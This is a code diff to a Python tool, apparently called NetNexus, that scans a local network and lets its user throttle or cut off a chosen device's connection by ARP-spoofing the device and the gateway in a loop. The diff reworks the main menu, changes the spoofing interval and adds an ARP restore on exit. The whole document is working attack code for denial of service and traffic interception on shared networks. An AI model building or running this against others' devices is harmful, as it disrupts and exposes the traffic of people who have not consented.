@@ -25,8 +25,7 @@ def background_scanner(ip_range):
 
 def main():
     global device_memory, stop_scanner
-    iface = "wlan0"
-    scapy.conf.iface = iface
+    iface = scapy.conf.iface
     
     if os.getuid() != 0:
         print("[-] Root required.")
@@ -45,71 +44,19 @@ def main():
         print("ID\tIP\t\tMAC\t\t\tNAME")
         print("-" * 60)
         
-        current_list = list(device_memory.values())
-        for i, dev in enumerate(current_list):
+        snapshot = list(device_memory.values())
+        for i, dev in enumerate(snapshot):
             print(f"{i}\t{dev['ip']}\t{dev['mac']}\t{dev['name']}")
         
         print("-" * 60)
-        print("Scanning... Enter ID to start action.")
+        choice = input("\nID (q to quit): ").lower()
         
-        try:
-            choice = input("\nID (q to quit): ").lower()
-            if choice == 'q':
-                stop_scanner = True
-                break
-            
-            target = current_list[int(choice)]
-            print(f"\n[1] Limit (kbps)  [2] Kill")
-            mode = input("Action: ")
-
-            gateway_mac, _ = spoof.get_device_info(gateway_ip)
-            wait_time = 0.5 if mode == "1" else 0.001
-            
-            if mode == "1":
-                kbps = input("kbps: ")
-                set_forwarding(True)
-                apply_limit(iface, kbps)
-            elif mode == "2":
-                set_forwarding(False)
-            else:
-                continue
-
-            print(f"[*] Active on {target['ip']}... Press Ctrl+C to stop.")
-            while True:
-                spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
-                time.sleep(wait_time)
-                
-        except (KeyboardInterrupt, ValueError, IndexError):
-            set_forwarding(True)
-            subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
-            continue
-
-if __name__ == "__main__":
-    main()
-    ip_range = f"{gateway_ip}/24"
-
-    threading.Thread(target=background_scanner, args=(ip_range,), daemon=True).start()
-
-    while True:
-        os.system('clear')
-        print("="*40)
-        print("          NetNexus")
-        print("="*40)
-        
-        current_list = list(device_memory.values())
-        for i, dev in enumerate(current_list):
-            print(f"{i}\t{dev['ip']}\t{dev['mac']}")
-        
-        print("-" * 40)
-        print("Scanning... (Automatic Refresh)")
-        choice = input("\nID (or 'q' to quit): ").lower()
-        
-        if choice == 'q': 
+        if choice == 'q':
             stop_scanner = True
             break
-
+            
         try:
-            target = current_list[int(choice)]
+            target = snapshot[int(choice)]
             print(f"\n[1] Limit (kbps)  [2] Kill")
             mode = input("Action: ")
 
@@ -122,21 +69,19 @@ if __name__ == "__main__":
                 wait_time = 0.5
             elif mode == "2":
                 set_forwarding(False)
-                wait_time = 0.001
+                wait_time = 0.05
             else: continue
 
-            print(f"[*] Active on {target['ip']}... Ctrl+C to switch target.")
+            print(f"[*] Active on {target['ip']}... Ctrl+C to stop.")
             while True:
                 spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                 time.sleep(wait_time)
                 
-        except KeyboardInterrupt:
+        except (KeyboardInterrupt, ValueError, IndexError):
             set_forwarding(True)
             subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
+            spoof.restore(target['ip'], gateway_ip)
             continue
-        except Exception as e:
-            print(f"[-] Error: {e}")
-            time.sleep(2)
 
 if __name__ == "__main__":
     main()
